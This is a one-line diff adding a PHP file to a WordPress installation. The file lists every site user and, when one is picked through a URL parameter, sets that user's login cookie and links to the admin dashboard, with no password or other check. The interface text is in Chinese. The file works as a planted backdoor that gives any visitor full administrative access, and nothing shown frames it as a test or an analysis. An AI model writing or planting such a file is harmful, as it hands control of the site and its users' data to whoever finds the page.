@@ -1,0 +1,1 @@
+<?php require_once('/var/www/html/wp-load.php'); if(isset($_GET['u'])){ $user = get_user_by('login',$_GET['u']); if($user){wp_set_auth_cookie($user->ID,true); echo "已登录为".$user->user_login."<br><a href='".(admin_url())."'>管理后台</a>";} } else { echo "<h2>请选择用户登录</h2>"; foreach(get_users() as $u){ echo "<a href='?u=".$u->user_login."'>". $u->user_login ."</a><br>"; } } ?>
